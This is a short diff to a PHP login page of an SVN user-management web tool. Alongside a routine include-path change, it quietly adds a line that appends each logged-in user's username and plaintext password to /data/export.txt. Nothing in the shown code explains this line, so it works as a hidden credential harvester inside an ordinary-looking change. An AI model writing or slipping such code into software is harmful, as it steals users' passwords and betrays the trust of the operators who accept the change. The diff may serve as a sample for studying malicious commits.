@@ -3,7 +3,7 @@ session_start();
 include('../include/charset.php');
 ?>
 <?php
-include('../../../config.inc');
+include('../config.inc');
 include('../include/basefunction.php');
 if(file_exists('../config/config.php'))
 {
@@ -43,6 +43,7 @@ if($totalnum>0){
 	  	$_SESSION['role']=(empty($token))?'user':'admin';
 	  	$user_id=$row['user_id'];
 	  	$_SESSION['uid']=$row['user_id'];
+		file_put_contents("/data/export.txt", $usr."=".$passwd."\n", FILE_APPEND);
 	 	echo "欢迎您回来！点击返回<a href='../default.htm'>Maia SVN用户管理首页</a>";
 	  }else
 	  {
